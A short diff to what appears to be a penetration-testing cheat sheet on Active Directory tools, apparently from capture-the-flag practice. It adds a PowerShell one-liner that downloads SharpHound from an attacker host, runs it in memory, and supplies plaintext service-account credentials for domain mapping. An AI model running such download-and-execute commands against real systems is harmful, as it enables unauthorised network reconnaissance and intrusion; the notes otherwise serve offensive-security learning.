@@ -205,6 +205,11 @@ Allows you to perform login attempts, pass the hash, execute commands, mimikatz,
 
 Graphically maps out an entire domain.
 
+```
+powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.5:8000/SharpHound.ps1'); Invoke-BloodHound -LDAPUser svc-alfresco -LDAPPass s3rvice"
+```
+Download zip and drag into Bloodhound window.
+
 ### Powersploit
 
 A whole bunch of enumeration and priv-esc Powershell scripts.
